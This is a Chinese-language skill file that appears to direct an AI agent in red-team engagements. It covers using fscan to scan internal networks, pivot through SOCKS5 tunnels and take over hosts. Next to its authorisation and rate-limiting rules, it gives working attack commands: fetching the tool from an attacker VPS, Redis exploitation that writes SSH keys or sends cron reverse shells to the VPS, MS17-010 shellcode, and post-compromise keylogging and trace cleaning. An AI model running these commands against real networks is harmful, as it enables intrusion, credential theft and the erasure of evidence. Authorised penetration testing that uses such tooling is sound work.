---
name: fscan-intranet
description: fscan v2.2.1 内网综合扫描（备用方案）：存活探测、端口/服务识别、MS17-010/SMBGhost 插件检测、未授权访问、Redis 利用与 SOCKS5 隧道；默认不爆破（-nobr）、不发 POC（-nopoc）
whenToUse: 内网扫描用技能 `gogo-scan` 不可用时，或需要 fscan 特有能力的备选（MS17-010 检测、本地插件生态、跳板机上开 SOCKS5）
role: internal,recon,exploit
enabled: true
---

# fscan（内网扫描备用方案，非首选）

> **内网扫描首选技能 `gogo-scan`。** 本技能是**备用方案**——只有首选方案不可用时，或需要 fscan 特有的
> MS17-010 检测 / 本地插件生态时才用它。隧道选型见技能 `tunnel-selection`。
>
> **默认参数是安全的**：不爆破（`-nobr`）、不打 POC（`-nopoc`）、并发/超时用保守档（`-t 100 -time 3`）。
> 弱口令爆破**只在用户明确授权后**才允许，且只对已圈定的少量目标做**定向**爆破（见下"爆破纪律"）。

`fscan` = **广度优先的内网普查**：一段 C 段丢进去，几分钟内给出存活主机、开放端口、服务指纹、Web 标题、
未授权访问、插件检测项。**噪声大**，只适合内网（对互联网目标用外部扫描技能），且**默认不发 POC、不爆破**。

## 二进制

```
本机 : $DSH_HOME/redteam/toolkit/fscan/fscan          （v2.2.1，含本地插件）
       $DSH_HOME/redteam/toolkit/fscan/fscan_windows_x64.exe
       $DSH_HOME/redteam/toolkit/fscan/fscan_linux_arm64
VPS  : http://<你的VPS_IP>:9100/fscan                     （技能 vps-reverse-shell 的载荷目录）
```

**传到跳板机/目标**（内网扫描必须在能到达内网的位置执行）：

```bash
# 跳板机上直接下载（VPS 起载荷服务：$DSH_HOME/redteam/toolkit/vps/vps.sh serve 9100）
curl -o fscan http://<你的VPS_IP>:9100/fscan && chmod +x fscan
# 或从本机经 shells 上传
```

## 纪律（先看这条）

0. **落地门禁**：上扫描器前，先按技能 `host-enum` 完成「本机清单 + 存活清单」——清点没做完不派扫描器（本技能 SOP 第 0/1 步是它的最小执行）。
1. **范围**：只用授权清单内的网段；用 `-eh/-ehf` 显式排除办公网、打印机、工控、云元数据（169.254.169.254）。
2. **别打崩设备**：默认 `-t 600` 对老设备/工控很危险。**内网基线用 `-t 100 -time 3`**，确认设备扛得住再加。
3. **默认无爆破、无 POC**：第一轮固定 `-nobr -nopoc` 只做资产面（`-m` 不写即默认跑全部服务插件 `all`，爆破与 POC 由这两个开关关掉，不是靠 `-m` 关）。
4. **爆破纪律（红线）**：**弱口令爆破只在用户明确授权后**才允许，且**只对已圈定的少量目标做定向爆破**——
   先确认目标无锁定/限流策略，字典先用针对性小字典（单位名/年份/域名组合），严格限流（`-t` 不超过 16），
   Windows / OA / 域账号**同一账号连续失败 5 次就停**（把账号打锁等于毁掉入口）。大规模服务爆破流量设备最敏感，别做。
5. **避开蜜罐/IDS**：`-rate` 限速、`-maxpkts` 限量；管理员可能在看着。
6. **DNSLog 外带**：`-dns -domain <你的dnslog域名>`，别用公共 DNSLog 传敏感数据。

## 标准作业流程（SOP）

```bash
# 0) 确认自己在哪、能到哪
ip a; ip route

# 1) 存活普查（最快，先圈定活人）
./fscan -h 10.0.0.0/24 -m icmp -o alive.txt -nocolor

# 2) 资产面（安全基线：不爆破、不打 POC、保守并发）
./fscan -h 10.0.0.0/24 -np -nobr -nopoc -t 100 -time 3 -o assets.txt

# 3) Web 优先：把 assets.txt 里的 web 端口交给技能 web-fingerprint 做指纹
./fscan -h 10.0.0.0/24 -p 80,443,8080,8000,8888,9000,7001,9090 -nobr -nopoc -nocolor

# 4) fscan 特有：高危漏洞插件检测（MS17-010 / SMBGhost；SMBGhost 在 smb 插件里，仍不开爆破）
./fscan -h 10.0.0.0/24 -m ms17010,smb -nobr -nopoc

# 5) 未授权访问复查（指定服务端口，不开爆破/POC）
./fscan -h 10.0.0.0/24 -p 6379,27017,9200,11211,2181 -nobr -nopoc

# 6) 定向爆破（仅在用户明确授权后，针对已圈定的少量目标）
./fscan -h 10.0.0.5 -m ssh -user root -pwdf /tmp/pass.txt -t 5
```

## 参数速查（实测 v2.2.1 `-help`）

**目标**
```
-h  <IP|CIDR|文件|域名>   目标（IP 段文件也吃）
-hf <file>                主机文件        -eh/-ehf  排除主机/排除文件
-u  <URL>  -uf <file>     单 URL / URL 文件     -domain <域名>
```

**端口与存活**
```
-p  21,22,80,443,3306,6379,10000-10100    端口（不指定则用内置常用端口集，数量随版本，以本版 fscan `-help` 为准）
-pf <file>  端口文件        -ep 排除端口
-np         禁用 ping 探测（只扫端口，快）      -ao  仅存活探测
-nsp        禁用网段预筛（大网段提速）          -ntp 禁用 TCP 补充探测
```

**模式**
```
-m all        跑全部服务插件（**默认值**）—— 爆破/POC 另由 -nobr/-nopoc 控制，切 `-m <插件>` 可收窄
-m icmp       仅存活
-m <插件>     只跑指定服务插件，例如 -m ssh / -m redis / -m smb / -m ms17010 / -m netbios
-nobr         禁爆破（默认基线）   -nopoc 禁 POC（默认基线）   -noredis 禁 Redis 利用
```

**并发与节流**（OPSEC 关键）
```
-t 600       端口扫描线程（内网基线用 100）      -time 3   端口超时(秒)
-mt 20       模块线程            -wt 5     Web 超时
-gt 0        全局超时(秒)        -retry 3  重试次数
-rate 0      每分钟最大发包数(0=不限)   -maxpkts 0  总发包上限
-num 10      POC 并发            -icmp-rate 0.1  ICMP 速率
```

**凭据（爆破，仅在授权后使用）**
```
-user/-pwd      单组账号密码          -userf/-pwdf  字典文件
-upf            用户名:密码 对文件     -usera/-pwda  追加多个（逗号/空格分隔）
-hash/-hashf    NTLM Hash 碰撞        -sshkey       私钥登录
```

**利用（拿到就用，注意授权边界）**
```
-rf <pubkey>        Redis 写公钥（写 authorized_keys 拿 SSH）
-rs <ip:port>      Redis 计划任务反弹 Shell 到指定地址（**带值，不是开关**）
-rsh <ip:port>     反弹 Shell 到指定地址（配合技能 vps-reverse-shell）
-sc <shellcode>    MS17-010 ShellCode
-local <plugin>    本机插件：systeminfo / keylogger / cleaner 等（在跳板机上跑）
-start-socks5 1080 在跳板机上开 SOCKS5 服务，把内网暴露给本机
-fsh-port 4444     正向 Shell 服务端口
```

**代理（打隧道后的核心用法）**
```
-socks5 127.0.0.1:1080                 走 SOCKS5（suo5 / ssh -D / frp 都行）
-socks5 socks5://user:pass@127.0.0.1:1080
-proxy http://127.0.0.1:8080           走 HTTP 代理
```

**输出**
```
-o result.txt    输出文件        -f txt|json|csv   格式
-no              不保存结果      -silent  静默     -nocolor/-nopg  关颜色/进度条
-lang zh|en      语言            -log "base,info,success"   日志级别
-dns             记录 DNS 日志（配合 -domain 做外带检测）
-perf            输出性能统计 JSON
```

## 关键场景

### 1. 通过隧道打内网（最常用）

```bash
# 前提：已有 socks5（技能 suo5-tunnel，或 vps-reverse-shell 里 ssh -D，或 frp；C2 socks5 仅临时低流量——铺面大流量走 frp）
# 实测验证过：fscan -socks5 会把流量真正送进隧道
./fscan -h 10.0.0.0/24 -p 22,80,445,3306,6379 -np -nobr -nopoc \
        -socks5 127.0.0.1:1080 -t 50 -time 5 -o intranet.txt
```

注意：走代理时线程别开太大（隧道本身是瓶颈），`-t 50` 左右足够。

### 2. 在跳板机上开隧道给本机用（fscan 特有）

跳板机上执行（把内网 10 段暴露到 VPS 的 9100 端口，再 ssh 本地转发回来）：

```bash
./fscan -start-socks5 1080      # 跳板机:1080 变成 SOCKS5
# VPS 上反向隧道：ssh -R 9200:127.0.0.1:1080 ubuntu@<你的VPS_IP>
# 本机：ssh -L 1080:127.0.0.1:9200 ubuntu@<你的VPS_IP>
# 之后所有工具都能 -socks5 127.0.0.1:1080
```

### 3. 拿 Redis 直接要权限

```bash
./fscan -h 10.0.0.5 -p 6379 -m redis -rf ~/.ssh/id_rsa.pub     # 写公钥 → ssh 上去
./fscan -h 10.0.0.5 -p 6379 -rs <你的VPS_IP>:9000               # Redis 计划任务反弹到 VPS 监听
./fscan -h 10.0.0.5 -p 6379 -rsh <你的VPS_IP>:9000              # 反弹到 VPS 监听
```

### 4. 落到服务器上之后

```bash
./fscan -local systeminfo        # 系统信息、环境变量、域控、网卡
./fscan -local keylogger         # 键盘记录（-keylog-output 指定输出）
./fscan -local cleaner           # 痕迹清理
```

## 结果落库（必须做）

fscan 的 txt 输出是分段的，解析后逐条入库：

```bash
# 每台存活主机
redteam_asset_add  { engagement, ip, source: "fscan", tags: ["internal"] }
# 每个开放端口/服务
redteam_asset_add  { engagement, ip, port, service, banner }   # 或 asset_link 关联
# 爆破/未授权成功的凭据与访问
redteam_credential_add { engagement, host, username, secret_type, secret_ref: "runs/fscan-<段>.txt" }
redteam_access_add     { engagement, host, username, method: "ssh", privilege, session_ref }
# 确认的漏洞（必须配 http_evidence 或等价证据）
redteam_vuln_add   { engagement, target, name: "Redis 未授权访问", severity: "high", evidence_ref }
```

**纪律**：`-o` 的输出文件是证据，拷回 `runs/`；不要只在终端里看一眼就算数。

## 排障

| 现象 | 处理 |
| --- | --- |
| 扫不动/极慢 | 去掉 `-np`、降 `-t`、加 `-time`；大网段先 `-m icmp` 圈活人 |
| 全是假开放 | 中间有防火墙/负载均衡回 SYN-ACK，用 `-time` 调大 + `-retry` 复核 |
| ICMP 失败 | 需要 root/`CAP_NET_RAW`；用 `sudo ./fscan -m icmp`，或改用 `-np` 只扫端口 |
| 爆破被锁 | 先用 `-usera` 少量试，确认无锁定策略（域账号尤其危险）；**只在授权后做定向爆破** |
| 中文乱码 | `-lang en` 或 `export LANG=zh_CN.UTF-8` |
| 想更安静 | `-nobr -nopoc -nocolor -nopg -t 50 -rate 3000`，必要时 `-silent` |

## 相关技能

- `gogo-scan`：内网扫描首选（默认不爆破、不发 POC，可操控性更强）
- `tunnel-selection`：隧道怎么选、怎么登记的唯一出处
- `suo5-tunnel`：WebShell → SOCKS5，给 fscan 提供 `-socks5` 入口
- `vps-reverse-shell`：`-rsh` 的落地端、载荷投递
- `webshell-toolkit`：拿到 WebShell 后的管理
